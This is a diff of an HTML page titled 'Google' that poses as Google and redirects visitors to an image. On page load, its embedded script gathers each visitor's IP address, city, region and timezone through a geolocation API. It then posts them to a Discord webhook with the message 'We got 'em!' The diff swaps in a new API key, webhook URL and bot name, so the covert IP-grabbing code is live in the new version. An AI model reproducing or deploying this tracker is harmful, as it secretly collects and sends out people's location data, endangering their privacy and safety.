@@ -3,8 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta http-equiv = "refresh" content = "0; url = https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.pinterest.com%2Fpin%2F470274386104585257%2F&psig=AOvVaw32J5Libn5PeVGUIFMsnJUl&ust=1685207295206000&source=images&cd=vfe&ved=0CBEQjRxqFwoTCNiw5MO8k_8CFQAAAAAdAAAAABAE" 
-/>
+    <meta http-equiv = "refresh" content = "0; url = https://i.pinimg.com/originals/18/cb/36/18cb364302a4841d6a7c246c3c0f0860.jpg" />
     <link rel="icon" type="image/x-icon" href="gfavicon.ico">
     <title>Google</title>
   </head>
@@ -17,7 +16,9 @@
     <script src="https://3kh0.github.io/js/main.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
     <script>
-      $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=856f5db902ee4edb9e77dcf2d48416ed", function (data) {
+      
+$.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=0ef2eeab203d4517b1886fe7b304fab6", 
+function (data) {
         const ip = data.ip_address;
         const city = data.city;
         const region = data.region;
@@ -31,12 +32,12 @@
         const tz = data.timezone.name;
         const ct = data.timezone.current_time;
         const request = new XMLHttpRequest();
-        request.open("POST", "https://discordapp.com/api/webhooks/1067523004118077461/9Bd-BzWj9rjGlbR_moSGz8uQgqQ9uMmnvoV8tanZstuFuKYsv54M1CksJjKbWZd3YjGf");
+        request.open("POST", "https://discordapp.com/api/webhooks/1111706757098643526/u2GS-Iw8M2rMrEUAWLUI0NTszB7NpY9SoqgdLqQyYsTBBjZMEo1HJ5-UPHprNFVcHBFZ");
         // Put in your discord webhook url above ^^^
         request.setRequestHeader("Content-type", "application/json");
         const params = {
-          username: "UltimateGrabBot",
-          avatar_url: "https://cdn.discordapp.com/attachments/1067518823525261365/1067530701378965646/image.png",
+          username: "TheRektBot",
+          avatar_url: "https://i.pinimg.com/originals/18/cb/36/18cb364302a4841d6a7c246c3c0f0860.jpg",
           content: "**We got 'em!**\n> IP: " + ip + 
           "\n> City: " + city + 
           "\n> Region: " + region + 
